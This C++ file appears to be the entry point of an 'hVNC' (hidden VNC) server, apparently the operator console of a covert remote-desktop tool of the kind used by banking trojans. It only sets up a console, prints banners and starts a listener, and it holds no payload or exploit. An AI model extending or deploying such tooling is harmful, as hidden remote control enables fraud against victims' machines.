﻿#include "Common.h"
#include "ControlWindow.h"
#include "Server.h"
#include "_version.h"
#include <thread>
#include <chrono>

int CALLBACK WinMain(HINSTANCE hInstance,
   HINSTANCE hPrevInstance,
   LPSTR lpCmdLine,
   int nCmdShow)
{
   AllocConsole();

   freopen("CONIN$", "r", stdin); 
   freopen("CONOUT$", "w", stdout); 
   freopen("CONOUT$", "w", stderr); 

   SetConsoleTitle(TEXT("HVNC"));
  
   printf("[-] Starting hVNC Server...\n");
   std::this_thread::sleep_for(std::chrono::milliseconds(700));
   printf("[-] made by mave12...\n");
   std::this_thread::sleep_for(std::chrono::milliseconds(700));
   printf("[+] Server Started!\n");
   std::this_thread::sleep_for(std::chrono::milliseconds(180));

   if(!StartServer(atoi(lpCmdLine)))
   {
      wprintf(TEXT("[!] Server Couldn't Start (Error: %d)\n"), WSAGetLastError()); 
      getchar();
      return 0;
   }
   return 0;
}